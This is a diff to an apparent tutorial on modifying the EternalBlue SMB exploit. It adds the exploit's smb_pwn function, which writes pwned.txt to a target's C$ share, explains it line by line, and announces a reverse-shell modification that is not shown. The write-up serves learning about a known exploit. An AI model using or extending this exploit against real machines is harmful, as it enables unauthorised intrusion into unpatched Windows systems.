@@ -66,6 +66,21 @@ We can see on the included picture that user test cannot delete the file.
 [testUser](/img/EternalBlue/delete.PNG)
 <h3> Modifying the exploit</h3>
 In case you can find a working pipe name or use credentials, creating a file on the target machine may not be that usefull for us. Let's modify the exploit code to get a reverse shell.
+First let's find the exploit in the code. looking in the code, we can find a function called smb_pwn.
+```
+def smb_pwn(conn, arch):
+	smbConn = conn.get_smbconnection()
+	
+	print('creating file c:\\pwned.txt on the target')
+	tid2 = smbConn.connectTree('C$')
+	fid2 = smbConn.createFile(tid2, '/pwned.txt')
+	smbConn.closeFile(tid2, fid2)
+	smbConn.disconnectTree(tid2)
+	```
+Let's look at it line by line. First line will create a smb connection. This is what we eill use to interact with the machine.
+The next line is a print, this will just write a line for us so we know what is currently happening.
+Then we will connect to the Driver C so we can egn our modification there. This is saved in a variable so in the next line we can finaly create a file called pwned.txt.
+Finaly we will close the connection.
 <h3> Upload shell</h3>
 
 
